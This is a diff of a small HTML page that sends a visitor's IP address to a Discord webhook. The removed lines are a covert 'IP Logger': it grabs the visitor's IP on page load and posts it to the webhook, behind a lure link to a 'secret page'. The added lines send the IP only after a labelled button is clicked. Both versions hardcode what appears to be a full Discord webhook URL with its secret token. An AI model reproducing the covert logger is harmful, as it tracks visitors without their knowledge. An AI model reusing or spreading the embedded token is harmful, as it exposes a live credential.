@@ -1,23 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IP Logger</title>
+    <title>IP Address Sender</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
-    <h1>Welcome to the IP Logger!</h1>
-    <p>Click <a href="https://discord.com/api/webhooks/1253208817601351802/QCTUfUvxVqXVxySeEQ60WODIl2nZosa6eAUyVyG2V-8ggRceP-C4Czgwvuy5SyhxVUuy">here</a> to access the secret page!</p>
-    
+    <h1>Click the button to send your IP address to the webhook</h1>
+    <button id="sendIpBtn">Send IP Address</button>
+
     <script>
-        fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const ipAddress = data.ip;
-            fetch('https://discord.com/api/webhooks/yourwebhookid', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: `IP Address: ${ipAddress}` })
+        $(document).ready(function() {
+            $('#sendIpBtn').click(function() {
+                $.get('https://api64.ipify.org', function(data) {
+                    var ip_address = data;
+                    var webhook_url = 'https://discord.com/api/webhooks/1253208817601351802/QCTUfUvxVqXVxySeEQ60WODIl2nZosa6eAUyVyG2V-8ggRceP-C4Czgwvuy5SyhxVUuy';
+                    $.post(webhook_url, { ip_address: ip_address });
+                });
             });
         });
     </script>
